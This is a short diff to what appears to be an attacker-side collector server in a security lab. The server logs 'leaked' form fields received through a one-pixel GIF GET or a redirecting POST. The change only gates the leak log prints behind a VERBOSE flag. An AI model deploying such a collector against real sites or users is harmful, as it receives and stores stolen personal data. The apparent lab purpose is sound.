@@ -21,6 +21,7 @@ ONE_PIXEL_GIF = bytes.fromhex(
     "47494638396101000100800000000000ffffff21f90401000000002c"
     "00000000010001000002024401003b"
 )
+VERBOSE = False  # set True for the Stage 2 leak prints
 LOG_PATH = Path(__file__).resolve().parent.parent / "logs" / "attacker.log"
 
 
@@ -38,7 +39,8 @@ class CollectorHandler(BaseHTTPRequestHandler):
                 "fields": fields,
             }
             append_log_entry(LOG_PATH, entry)
-            print(f"[collector] LEAK logged (GET): {fields}")
+            if VERBOSE:
+                print(f"[collector] LEAK logged (GET): {fields}")
         self.send_response(200)
         self.send_header("Content-Type", "image/gif")
         self.send_header("Content-Length", str(len(ONE_PIXEL_GIF)))
@@ -58,7 +60,8 @@ class CollectorHandler(BaseHTTPRequestHandler):
             "fields": parse_form_body(raw_body),
         }
         append_log_entry(LOG_PATH, entry)
-        print(f"[collector] LEAK logged: {entry['fields']}  (from {entry['origin']})")
+        if VERBOSE:
+            print(f"[collector] LEAK logged: {entry['fields']}  (from {entry['origin']})")
 
         # 303 See Other: "browser, now GET this other page"
         self.send_response(303)
